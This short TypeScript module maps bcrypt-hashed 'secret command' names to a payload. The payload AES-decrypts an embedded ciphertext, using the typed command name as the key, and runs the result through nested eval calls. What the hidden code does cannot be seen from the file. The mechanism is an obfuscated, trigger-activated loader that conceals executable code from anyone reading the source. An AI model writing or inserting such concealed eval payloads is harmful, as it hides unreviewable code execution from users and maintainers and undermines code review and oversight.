import bcrypt from 'bcrypt';

export interface SecretCommand {
  hash: string;
  payload: string;
}

export const secretCommands: SecretCommand[] = [
  {
    hash: '$2a$10$aEe4NE0KZMFdGF.68wrkhOc5l0b0w.KPnkVF9Niicwdzp9CgdkoSC',
    payload: `eval("let a = CryptoJS.AES.decrypt('U2FsdGVkX18kVsfpyvm4z65VO/AhGUhoOIE0rEpGBriRVqfBll8auGGM5lGRXzuUVN2a3sEh97vAyqn8CfMFAQ==','{{command}}').toString(CryptoJS.enc.Utf8); eval(a)")`,
  },
];

export function findSecretCommand(commandName: string): SecretCommand | undefined {
  return secretCommands.find((sc) => bcrypt.compareSync(commandName, sc.hash));
}
